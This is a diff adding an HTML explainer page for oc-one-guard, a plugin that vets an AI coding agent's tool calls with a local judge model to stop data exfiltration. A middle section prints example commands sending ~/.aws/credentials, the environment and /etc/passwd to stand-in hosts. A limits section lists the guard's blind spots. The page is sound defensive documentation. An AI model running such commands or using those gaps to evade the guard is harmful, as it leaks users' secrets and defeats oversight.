@@ -1,0 +1,954 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="color-scheme" content="light dark">
+<title>oc-one-guard - what actually happens to a tool call</title>
+<meta name="description" content="A visual walkthrough of the oc-one-guard OpenCode plugin: the blocked-host scan, tool lists, prefilter, System One judge, and the fail-closed verdict. Current behaviour, not marketing.">
+<style>
+  :root {
+    --bg: #f6f6f4;
+    --surface: #ffffff;
+    --surface-2: #f0f0ed;
+    --ink: #17191b;
+    --ink-soft: #4c5257;
+    --ink-faint: #5e656b;
+    --line: #e1e2df;
+    --line-strong: #c9cbc7;
+    --accent: #135e58;
+    --accent-soft: #e4efed;
+    --allow: #1f6b45;
+    --allow-soft: #e6f1ea;
+    --warn: #8a5a10;
+    --warn-soft: #f7eeda;
+    --deny: #a33131;
+    --deny-soft: #f9e9e7;
+    --radius: 10px;
+    --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "Liberation Mono", monospace;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+    /* Height of the sticky masthead, used to offset anchor targets. Overwritten
+       at runtime with the measured height; the fallback covers no-JS. */
+    --nav-offset: 3.5rem;
+  }
+
+  /* Fallback offsets for the no-JS case: the masthead wraps to two lines
+     below 46rem and to three lines below 31rem. */
+  @media (max-width: 46rem) {
+    :root { --nav-offset: 5.5rem; }
+  }
+  @media (max-width: 31rem) {
+    :root { --nav-offset: 7rem; }
+  }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #121416;
+      --surface: #1a1d20;
+      --surface-2: #212528;
+      --ink: #e9e9e7;
+      --ink-soft: #b3b8bc;
+      --ink-faint: #949ba1;
+      --line: #2b3034;
+      --line-strong: #3d444a;
+      --accent: #6fcdc3;
+      --accent-soft: #16302e;
+      --allow: #7bd0a1;
+      --allow-soft: #16301f;
+      --warn: #e2b768;
+      --warn-soft: #33260f;
+      --deny: #f0938c;
+      --deny-soft: #3a1b1b;
+    }
+  }
+
+  * { box-sizing: border-box; }
+
+  html { -webkit-text-size-adjust: 100%; }
+
+  /* Anchor targets must clear the sticky masthead, otherwise a jump to a
+     section hides its heading behind the nav. */
+  main[id],
+  section[id],
+  h2[id],
+  h3[id] {
+    scroll-margin-top: calc(var(--nav-offset) + 0.75rem);
+  }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--ink);
+    font-family: var(--sans);
+    font-size: 1rem;
+    line-height: 1.6;
+    overflow-wrap: break-word;
+  }
+
+  .skip {
+    position: absolute;
+    left: -9999px;
+    top: 0;
+    background: var(--accent);
+    color: var(--bg);
+    padding: 0.6rem 1rem;
+    z-index: 10;
+  }
+  .skip:focus { left: 0.5rem; top: 0.5rem; }
+
+  a { color: var(--accent); }
+  a:focus-visible,
+  summary:focus-visible {
+    outline: 2px solid var(--accent);
+    outline-offset: 2px;
+    border-radius: 4px;
+  }
+
+  code, kbd, samp {
+    font-family: var(--mono);
+    font-size: 0.86em;
+  }
+  code {
+    background: var(--surface-2);
+    border: 1px solid var(--line);
+    border-radius: 5px;
+    padding: 0.08em 0.34em;
+    overflow-wrap: anywhere;
+  }
+  pre {
+    margin: 0.6rem 0 0;
+    background: var(--surface-2);
+    border: 1px solid var(--line);
+    border-radius: var(--radius);
+    padding: 0.7rem 0.85rem;
+    overflow-x: auto;
+  }
+  pre code {
+    background: none;
+    border: 0;
+    padding: 0;
+    font-size: 0.82rem;
+    white-space: pre-wrap;
+    overflow-wrap: anywhere;
+  }
+
+  .wrap {
+    max-width: 78rem;
+    margin: 0 auto;
+    padding: 0 1.15rem;
+  }
+
+  /* ---------- Header ---------- */
+
+  .masthead {
+    border-bottom: 1px solid var(--line);
+    background: var(--surface);
+    position: sticky;
+    top: 0;
+    z-index: 5;
+  }
+  .masthead .wrap {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem 1.2rem;
+    align-items: baseline;
+    justify-content: space-between;
+    padding-top: 0.7rem;
+    padding-bottom: 0.7rem;
+  }
+  .brand {
+    font-family: var(--mono);
+    font-size: 0.95rem;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+    margin: 0;
+    white-space: nowrap;
+  }
+  .brand span { color: var(--ink-faint); font-weight: 400; }
+  .masthead nav ul {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.35rem 1rem;
+    list-style: none;
+    margin: 0;
+    padding: 0;
+    font-size: 0.88rem;
+  }
+  .masthead nav a { text-decoration: none; }
+  .masthead nav a:hover { text-decoration: underline; }
+
+  /* ---------- Hero ---------- */
+
+  .hero { padding: 2.4rem 0 1.2rem; }
+  .hero h1 {
+    font-size: clamp(1.65rem, 1.1rem + 2.6vw, 2.7rem);
+    line-height: 1.15;
+    letter-spacing: -0.02em;
+    margin: 0 0 0.7rem;
+    max-width: 24ch;
+  }
+  .hero p {
+    margin: 0 0 0.8rem;
+    color: var(--ink-soft);
+    max-width: 62ch;
+    font-size: 1.05rem;
+  }
+  .hero p strong { color: var(--ink); font-weight: 600; }
+
+  .facts {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.4rem;
+    list-style: none;
+    margin: 1.1rem 0 0;
+    padding: 0;
+  }
+  .facts li {
+    font-family: var(--mono);
+    font-size: 0.75rem;
+    color: var(--ink-soft);
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-radius: 999px;
+    padding: 0.18rem 0.65rem;
+  }
+  .facts li b { color: var(--ink); font-weight: 600; }
+
+  .note {
+    border-left: 3px solid var(--line-strong);
+    padding: 0.1rem 0 0.1rem 0.9rem;
+    margin: 1.6rem 0 0;
+    color: var(--ink-soft);
+    font-size: 0.95rem;
+    max-width: 68ch;
+  }
+
+  /* ---------- Sections ---------- */
+
+  section { padding: 2rem 0 0; }
+  h2 {
+    font-size: clamp(1.25rem, 1.05rem + 1vw, 1.65rem);
+    line-height: 1.25;
+    letter-spacing: -0.015em;
+    margin: 0 0 0.4rem;
+  }
+  h2 .h2-mark {
+    color: var(--ink-faint);
+    font-family: var(--mono);
+    font-size: 0.7em;
+    margin-right: 0.65rem;
+    white-space: nowrap;
+  }
+  h3 {
+    font-size: 1.02rem;
+    line-height: 1.35;
+    margin: 0 0 0.35rem;
+    letter-spacing: -0.01em;
+  }
+  .section-intro {
+    color: var(--ink-soft);
+    margin: 0 0 1.3rem;
+    max-width: 66ch;
+  }
+  .section-intro a { overflow-wrap: anywhere; }
+
+  /* ---------- Flow diagram ---------- */
+
+  .flow {
+    list-style: none;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+  }
+  .flow > li { position: relative; }
+  .flow > li + li::before {
+    content: "\2193";
+    display: block;
+    text-align: center;
+    color: var(--ink-faint);
+    font-size: 0.9rem;
+    line-height: 1;
+    margin: 0.5rem 0;
+  }
+
+  .step {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-left: 3px solid var(--line-strong);
+    border-radius: var(--radius);
+    padding: 0.95rem 1rem 1rem;
+    height: 100%;
+  }
+  .step.is-judge { border-left-color: var(--accent); }
+  .step.is-outcome { border-left-color: var(--accent); }
+
+  .step-head {
+    display: flex;
+    align-items: baseline;
+    gap: 0.6rem;
+    margin-bottom: 0.4rem;
+  }
+  .step-num {
+    font-family: var(--mono);
+    font-size: 0.72rem;
+    font-weight: 700;
+    color: var(--bg);
+    background: var(--ink-soft);
+    border-radius: 4px;
+    padding: 0.1rem 0.36rem;
+    flex: none;
+  }
+  .step.is-judge .step-num { background: var(--accent); }
+  .step-title { font-weight: 650; letter-spacing: -0.01em; }
+  .step p {
+    margin: 0 0 0.55rem;
+    color: var(--ink-soft);
+    font-size: 0.94rem;
+  }
+  .step p:last-child { margin-bottom: 0; }
+  .step p strong { color: var(--ink); font-weight: 600; }
+
+  .tag {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 0.72rem;
+    letter-spacing: 0.02em;
+    text-transform: lowercase;
+    border-radius: 4px;
+    padding: 0.12rem 0.42rem;
+    border: 1px solid var(--line-strong);
+    color: var(--ink-soft);
+    background: var(--surface-2);
+    white-space: nowrap;
+  }
+  .tag.tag-judge { color: var(--accent); border-color: var(--accent); background: var(--accent-soft); }
+  .tag.tag-local { color: var(--ink-faint); }
+
+  /* ---------- Verdict grid ---------- */
+
+  .grid {
+    display: grid;
+    gap: 0.9rem;
+    grid-template-columns: repeat(auto-fit, minmax(15.5rem, 1fr));
+  }
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--line);
+    border-top: 3px solid var(--line-strong);
+    border-radius: var(--radius);
+    padding: 0.95rem 1rem 1rem;
+  }
+  .card p { margin: 0 0 0.55rem; color: var(--ink-soft); font-size: 0.94rem; }
+  .card p:last-child { margin-bottom: 0; }
+  .card p strong { color: var(--ink); font-weight: 600; }
+  .card.allow { border-top-color: var(--allow); }
+  .card.warn { border-top-color: var(--warn); }
+  .card.deny { border-top-color: var(--deny); }
+  .card.fail { border-top-color: var(--deny); border-style: dashed; border-top-style: solid; }
+  .card .verdict {
+    font-family: var(--mono);
+    font-size: 0.72rem;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    margin: 0 0 0.35rem;
+    display: block;
+  }
+  .card.allow .verdict { color: var(--allow); }
+  .card.warn .verdict { color: var(--warn); }
+  .card.deny .verdict { color: var(--deny); }
+
+  /* ---------- Two-column split on wide screens ---------- */
+
+  @media (min-width: 72rem) {
+    .flow {
+      display: grid;
+      grid-template-columns: repeat(5, minmax(0, 1fr));
+      gap: 1.15rem;
+      align-items: stretch;
+    }
+    .flow > li + li::before {
+      content: "\2192";
+      position: absolute;
+      left: -1.05rem;
+      top: 50%;
+      transform: translateY(-50%);
+      margin: 0;
+      line-height: 1;
+    }
+  }
+
+  @media (min-width: 46rem) {
+    .split {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(min(100%, 26rem), 1fr));
+      gap: 0.9rem;
+    }
+  }
+
+  /* ---------- Details ---------- */
+
+  details {
+    border: 1px solid var(--line);
+    border-radius: var(--radius);
+    background: var(--surface);
+    padding: 0.7rem 0.9rem;
+    margin-bottom: 0.7rem;
+  }
+  summary {
+    cursor: pointer;
+    font-weight: 600;
+    letter-spacing: -0.01em;
+    list-style: revert;
+  }
+  details[open] summary { margin-bottom: 0.6rem; }
+  details .body { color: var(--ink-soft); font-size: 0.94rem; }
+  details .body p { margin: 0 0 0.6rem; }
+  details .body p:last-child { margin-bottom: 0; }
+  details .body strong { color: var(--ink); font-weight: 600; }
+
+  /* ---------- Lists ---------- */
+
+  ul.plain { list-style: none; margin: 0; padding: 0; }
+  ul.plain li {
+    position: relative;
+    padding-left: 1.15rem;
+    margin-bottom: 0.75rem;
+    color: var(--ink-soft);
+    max-width: 70ch;
+  }
+  ul.plain li:last-child { margin-bottom: 0; }
+  ul.plain li::before {
+    content: "";
+    position: absolute;
+    left: 0;
+    top: 0.62em;
+    width: 0.45rem;
+    height: 0.45rem;
+    border-radius: 2px;
+    background: var(--line-strong);
+  }
+  ul.plain li strong { color: var(--ink); font-weight: 600; }
+
+  /* ---------- Footer ---------- */
+
+  .footer {
+    margin-top: 3rem;
+    border-top: 1px solid var(--line);
+    background: var(--surface);
+    padding: 1.6rem 0 2.4rem;
+  }
+  .footer h2 { font-size: 1rem; margin-bottom: 0.7rem; }
+  .footer ul {
+    list-style: none;
+    margin: 0 0 1rem;
+    padding: 0;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.4rem 1.4rem;
+    font-size: 0.92rem;
+  }
+  .footer p { margin: 0; color: var(--ink-faint); font-size: 0.85rem; max-width: 70ch; }
+
+  @media print {
+    /* Printing from a dark-scheme browser would otherwise paint near-white
+       ink on the forced white background. Reset the whole palette instead of
+       only the body background, and keep the surface shades light. */
+    :root {
+      color-scheme: light;
+      --bg: #ffffff;
+      --surface: #ffffff;
+      --surface-2: #f4f4f2;
+      --ink: #000000;
+      --ink-soft: #33383c;
+      --ink-faint: #555c62;
+      --line: #c6c8c5;
+      --line-strong: #8d918e;
+      --accent: #0d4a45;
+      --accent-soft: #e8f0ef;
+      --allow: #175c39;
+      --allow-soft: #e9f2ec;
+      --warn: #6d470c;
+      --warn-soft: #f8f1e2;
+      --deny: #8c2626;
+      --deny-soft: #f8eaea;
+    }
+    html {
+      -webkit-print-color-adjust: exact;
+      print-color-adjust: exact;
+    }
+    .masthead { position: static; }
+    body { background: #fff; color: var(--ink); }
+  }
+</style>
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+
+<header class="masthead">
+  <div class="wrap">
+    <p class="brand">oc-one-guard <span>/ explainer</span></p>
+    <nav aria-label="Sections on this page">
+      <ul>
+        <li><a href="#flow">The flow</a></li>
+        <li><a href="#verdict">Verdicts</a></li>
+        <li><a href="#catches">What it catches</a></li>
+        <li><a href="#limits">Limits</a></li>
+        <li><a href="#trust">Trust &amp; data</a></li>
+        <li><a href="#support">Support</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+  <div class="wrap">
+
+    <div class="hero">
+      <h1>What actually happens to a tool call</h1>
+      <p>
+        <strong>oc-one-guard</strong> is an OpenCode plugin that looks at a proposed tool call
+        before it runs, and stops the ones that look like outbound data exfiltration.
+        It asks a local decision model over <code>POST /v1/systemone</code>.
+      </p>
+      <p>
+        This page describes the current implementation - not what it could become one day.
+        It is a <strong>heuristic guardrail</strong>, not a network security boundary,
+        and the project says so in its own documentation too.
+      </p>
+
+      <ul class="facts">
+        <li><b>OpenCode</b> v1 only</li>
+        <li>tested on <b>1.19.4</b></li>
+        <li>judge <b>/v1/systemone</b></li>
+        <li>timeout <b>20s</b></li>
+        <li>escalate <b>&ge; 0.45</b></li>
+        <li>deny <b>&ge; 0.75</b></li>
+        <li>fail mode <b>block</b></li>
+      </ul>
+
+      <p class="note">
+        One thing worth saying up front: <strong>the judge does not see every call</strong>.
+        Most local work - reads, greps, a plain build - is settled locally before any request
+        goes out. That is by design, and it is the third step in the flow below.
+      </p>
+    </div>
+
+    <section id="flow" aria-labelledby="flow-heading">
+      <h2 id="flow-heading"><span class="h2-mark" aria-hidden="true">01</span>The flow, in order</h2>
+      <p class="section-intro">
+        Everything happens inside the <code>tool.execute.before</code> hook. If the hook throws,
+        OpenCode never runs the tool and hands the reason back to the agent as a failed tool result.
+      </p>
+
+      <ol class="flow">
+        <li>
+          <div class="step">
+            <div class="step-head">
+              <span class="step-num">1</span>
+              <span class="step-title">A tool call is proposed</span>
+            </div>
+            <p>
+              OpenCode fires the hook with the tool name and its arguments. Nothing has executed yet.
+              The guard sees the same arguments the model produced.
+            </p>
+            <span class="tag tag-local">local</span>
+          </div>
+        </li>
+
+        <li>
+          <div class="step">
+            <div class="step-head">
+              <span class="step-num">2</span>
+              <span class="step-title">Blocked-host scan runs first</span>
+            </div>
+            <p>
+              Every string value and object key in the arguments is scanned for explicit URLs.
+              A host matching <code>blockedHosts</code> is denied <strong>before</strong> any override
+              or judge request.
+            </p>
+            <p>
+              If the arguments are too deep, too many, or too large to scan completely, the scan is
+              also a denial - it cannot prove the destination is safe.
+            </p>
+            <span class="tag tag-local">local</span>
+          </div>
+        </li>
+
+        <li>
+          <div class="step">
+            <div class="step-head">
+              <span class="step-num">3</span>
+              <span class="step-title">Tool lists and the prefilter</span>
+            </div>
+            <p>
+              <code>deniedTools</code> is always denied. <code>skipTools</code> and
+              <code>allowedTools</code> skip the judge entirely.
+            </p>
+            <p>
+              Then the prefilter: a call with no outbound surface - <code>read</code>,
+              <code>grep</code>, <code>glob</code>, a shell command with no network primitive,
+              a plain GET - is allowed without contacting the judge.
+            </p>
+            <span class="tag tag-local">local</span>
+          </div>
+        </li>
+
+        <li>
+          <div class="step is-judge">
+            <div class="step-head">
+              <span class="step-num">4</span>
+              <span class="step-title">The System One judge</span>
+            </div>
+            <p>
+              Whatever is left is rendered - tool, arguments, extracted hosts and paths, file
+              references, and the contents of files the agent wrote earlier - and POSTed to the
+              configured endpoint with the model id and the question definitions.
+            </p>
+            <p>Default timeout is 20 seconds, and the timeout covers reading the response body.</p>
+            <span class="tag tag-judge">judge called</span>
+          </div>
+        </li>
+
+        <li>
+          <div class="step is-outcome">
+            <div class="step-head">
+              <span class="step-num">5</span>
+              <span class="step-title">A verdict</span>
+            </div>
+            <p>
+              The judge returns a probability for the deny label. Below 0.45 allows, 0.45 up to
+              0.75 escalates, 0.75 and up denies.
+            </p>
+            <p>
+              A failed request, a timeout, an unparseable answer, or an answer that cannot be
+              classified is treated as a denial by default.
+            </p>
+            <span class="tag tag-judge">from judge</span>
+          </div>
+        </li>
+      </ol>
+    </section>
+
+    <section id="verdict" aria-labelledby="verdict-heading">
+      <h2 id="verdict-heading"><span class="h2-mark" aria-hidden="true">02</span>What each verdict means</h2>
+      <p class="section-intro">
+        The thresholds are decision cutoffs on a model output, not calibrated probabilities.
+        They are configurable, and the defaults are the ones below.
+      </p>
+
+      <div class="grid">
+        <div class="card allow">
+          <span class="verdict">Allow</span>
+          <h3>Nothing happens</h3>
+          <p>
+            The call runs normally. No toast, no warning. The decision still lands in the audit
+            trail, and in the OpenCode log it is written at debug level.
+          </p>
+        </div>
+
+        <div class="card warn">
+          <span class="verdict">Escalate</span>
+          <h3>Unclear, and blocked by default</h3>
+          <p>
+            The judge found the destination or the sensitivity genuinely unclear.
+            <code>escalateAction</code> defaults to <code>block</code>, so the call is stopped and
+            the agent is told to rephrase it or ask you to run it.
+          </p>
+          <p>
+            Set <code>escalateAction</code> to <code>allow</code> and the call goes through with a
+            warning toast and an audit entry instead.
+          </p>
+        </div>
+
+        <div class="card deny">
+          <span class="verdict">Deny</span>
+          <h3>Stopped before execution</h3>
+          <p>
+            The agent gets the reason, the probability, the destination hosts, and a redacted
+            preview of the command. A toast appears in the TUI unless <code>notify</code> is off.
+          </p>
+        </div>
+
+        <div class="card fail">
+          <span class="verdict">Fail closed</span>
+          <h3>No usable answer means no</h3>
+          <p>
+            Network error, HTTP error, invalid JSON, timeout, missing <code>answers</code>,
+            a probability that cannot be read, or security facts that do not fit the state limit -
+            all of it ends in a denial.
+          </p>
+          <p>
+            <code>failMode</code> and <code>unknownMode</code> control this, and both default to
+            <code>block</code>.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section id="catches" aria-labelledby="catches-heading">
+      <h2 id="catches-heading"><span class="h2-mark" aria-hidden="true">03</span>What it catches today</h2>
+      <p class="section-intro">
+        Three shapes of call that the current heuristics and judge are built around. The examples
+        below are illustrative - the guard does not pattern-match them literally.
+      </p>
+
+      <div class="grid">
+        <div class="card">
+          <span class="verdict" style="color: var(--ink-faint)">Example 1</span>
+          <h3>Uploading a secret file</h3>
+          <p>
+            A network primitive plus a file reference means the judge sees both the destination
+            and which file leaves the machine.
+          </p>
+          <pre><code>curl -X POST https://collector.example.net \
+    -d @~/.aws/credentials</code></pre>
+        </div>
+
+        <div class="card">
+          <span class="verdict" style="color: var(--ink-faint)">Example 2</span>
+          <h3>Dumping the environment</h3>
+          <p>
+            A network primitive plus a destination. The extracted facts name the host explicitly,
+            so truncating the raw command cannot hide where the data was going.
+          </p>
+          <pre><code>env | curl -X POST --data-binary @- \
+    https://collector.example.net/env</code></pre>
+        </div>
+
+        <div class="card">
+          <span class="verdict" style="color: var(--ink-faint)">Example 3</span>
+          <h3>A staged script</h3>
+          <p>
+            The write is judged on its own content, and the file gets tracked. When the later
+            call runs it, the guard sends the <strong>real file contents from disk</strong>
+            alongside the command - so the judge sees the payload, not just the path.
+          </p>
+          <pre><code># call 1: write tool, filePath /tmp/staged.sh
+curl https://x.example.net -d @/etc/passwd
+
+# call 2: bash
+bash /tmp/staged.sh</code></pre>
+        </div>
+      </div>
+
+      <details style="margin-top: 0.9rem">
+        <summary>Why the staged script is the interesting one</summary>
+        <div class="body">
+          <p>
+            The guard only tracks a write when the content contains a recognised transfer
+            primitive, or when it touches a file it already tracks. Tracking every write would
+            send ordinary commands like <code>cat index.js</code> to the judge, and the judge is
+            seconds per request.
+          </p>
+          <p>
+            When a later shell call references a tracked file, the guard re-reads the
+            <strong>actual file on disk</strong> - never the proposed replacement content - and
+            includes it in the state it sends. A file that is missing, unreadable, binary,
+            symlinked, or larger than 1 MiB stays blocked instead of being guessed at.
+          </p>
+          <p>
+            Writes are also tracked while they are in flight. A shell call that runs a local
+            script while a write is still pending is blocked, and the snapshot is re-read after
+            the judge responds.
+          </p>
+        </div>
+      </details>
+    </section>
+
+    <section id="limits" aria-labelledby="limits-heading">
+      <h2 id="limits-heading"><span class="h2-mark" aria-hidden="true">04</span>Where it stops</h2>
+      <p class="section-intro">
+        The limits are not footnotes. They are the reason the project calls itself a guardrail.
+      </p>
+
+      <div class="split">
+        <div class="card">
+          <h3>Not a network boundary</h3>
+          <p>
+            The guard cannot see sockets opened by child processes, and it cannot control arbitrary
+            network activity by tools or subprocesses. It reviews the call you can see; it does not
+            police the machine.
+          </p>
+          <p>
+            It is not a replacement for OS sandboxing, network egress policy, or a human reading
+            the diff.
+          </p>
+        </div>
+
+        <div class="card">
+          <h3>Heuristic coverage</h3>
+          <p>
+            The URL scan looks at explicit URLs in string values and object keys. Bare hostnames and
+            encoded URLs are invisible to it. Shell parsing is heuristic too.
+          </p>
+          <p>
+            The prefilter can miss an outbound-capable command, and filesystem changes outside the
+            observed hooks can race the check.
+          </p>
+        </div>
+
+        <div class="card">
+          <h3>False positives</h3>
+          <p>
+            The judge can flag a legitimate command - a deploy to your own server, a fetch against
+            an internal API. With <code>escalateAction: block</code>, that is a blocked call and a
+            confused agent.
+          </p>
+          <p>
+            It happens. The recovery path is deliberate: rephrase the call so the intent is
+            explicit, or ask the user to run it by hand.
+          </p>
+        </div>
+
+        <div class="card">
+          <h3>An offline judge looks like a broken agent</h3>
+          <p>
+            Fail-closed means an unreachable judge blocks every call that needs review. That is the
+            intended trade, but from the inside it looks like the agent stopped working.
+          </p>
+          <p>
+            To turn it off properly, stop OpenCode outside the TUI and remove the plugin entry
+            from your configuration. <code>enabled: false</code> is not enough - the blocked-host
+            scan still runs.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section id="trust" aria-labelledby="trust-heading">
+      <h2 id="trust-heading"><span class="h2-mark" aria-hidden="true">05</span>Trust and data handling</h2>
+      <p class="section-intro">
+        Worth reading twice if you plan to install this. The judge is inside your trust boundary.
+      </p>
+
+      <div class="split">
+        <div class="card">
+          <h3>The judge sees sensitive data</h3>
+          <p>
+            Rendered tool arguments and extracted facts go to the configured endpoint. Depending on
+            the call, that includes secret-bearing command strings and the contents of files the
+            agent wrote.
+          </p>
+          <p>
+            Redaction runs on audit state and error text, and on the command preview in a blocked
+            message. <strong>It does not run on the judge request.</strong> Redaction is also
+            best-effort, not comprehensive.
+          </p>
+        </div>
+
+        <div class="card">
+          <h3>The endpoint is your endpoint</h3>
+          <p>
+            The default URL is plain HTTP on loopback, which gives you no transport confidentiality
+            and no server authentication. An <code>apiKey</code> adds a bearer header; it does not
+            encrypt anything.
+          </p>
+          <p>
+            Use loopback or a trusted, protected network endpoint, and protect the audit files -
+            they can contain rendered state too.
+          </p>
+        </div>
+
+        <div class="card">
+          <h3>An unloaded plugin protects nothing</h3>
+          <p>
+            The guard can only act after OpenCode loads it and calls its hooks. Fail-closed defaults
+            govern decisions <em>inside</em> the loaded guard - they cannot guard a session where
+            the plugin never started.
+          </p>
+          <p>
+            Registration is opt-in and manual. Restart OpenCode after changing the plugin entry and
+            check the startup log.
+          </p>
+        </div>
+
+        <div class="card">
+          <h3>Audit trail</h3>
+          <p>
+            Verdicts go to the OpenCode server log, and optionally to a JSONL file with rotation.
+            The OpenCode log keeps verdict metadata, destinations, reason, and timing - but not the
+            rendered state.
+          </p>
+          <p>
+            The JSONL file does record the rendered state, redacted on the way in, because after an
+            incident the question is "what exactly was blocked". Files are created owner-only, yet
+            they may still hold sensitive state. Retention is your problem.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <section id="support" aria-labelledby="support-heading">
+      <h2 id="support-heading"><span class="h2-mark" aria-hidden="true">06</span>Support and versioning</h2>
+      <p class="section-intro">
+        Short version, because it is easy to get wrong.
+      </p>
+
+      <ul class="plain">
+        <li>
+          <strong>OpenCode v1 only.</strong> The tested host is 1.19.4, and the conservative
+          supported range is <code>&gt;=1.19.4 &lt;2</code> - which does not mean every version in
+          that range was tested. Older versions are unsupported.
+        </li>
+        <li>
+          <strong>No v2 runtime.</strong> There is no OpenCode v2 port in this release. The entry
+          point and hooks target v1.
+        </li>
+        <li>
+          <strong>Not published.</strong> The repository is not on npm yet, so installation is
+          from a local checkout with an explicit path entry in your OpenCode configuration.
+        </li>
+        <li>
+          <strong>Judges can be llama-server or compatible.</strong> The endpoint contract is the
+          System One decision API - <code>POST /v1/systemone</code> with the model id, the rendered
+          state, and the question definitions.
+        </li>
+        <li>
+          <strong>Source is the truth.</strong> The implementation, the README, and the
+          <a href="./adr/README.md">architecture decisions</a> describe current behaviour.
+          This page follows them.
+        </li>
+      </ul>
+    </section>
+
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="wrap">
+    <h2>Keep reading</h2>
+    <ul>
+      <li><a href="./README.md">Docs README</a></li>
+      <li><a href="../README.md">Repository README</a></li>
+      <li><a href="./installation.md">Installation</a></li>
+      <li><a href="./configuration.md">Configuration</a></li>
+      <li><a href="./security.md">Security &amp; data handling</a></li>
+      <li><a href="./contributing.md">Contributing</a></li>
+      <li><a href="./adr/README.md">Design decisions</a></li>
+    </ul>
+    <p>
+      This page describes the current implementation of oc-one-guard. It is a heuristic guardrail
+      for OpenCode v1, not a network security boundary - read the
+      <a href="./security.md">security and data handling guide</a> before you rely on it.
+    </p>
+  </div>
+  </footer>
+
+<script>
+  (function () {
+    var masthead = document.querySelector('.masthead');
+    if (!masthead) return;
+    function sync() {
+      var height = Math.ceil(masthead.getBoundingClientRect().height);
+      document.documentElement.style.setProperty('--nav-offset', height + 'px');
+    }
+    sync();
+    window.addEventListener('resize', sync);
+    if (window.ResizeObserver) new ResizeObserver(sync).observe(masthead);
+  })();
+</script>
+
+</body>
+</html>
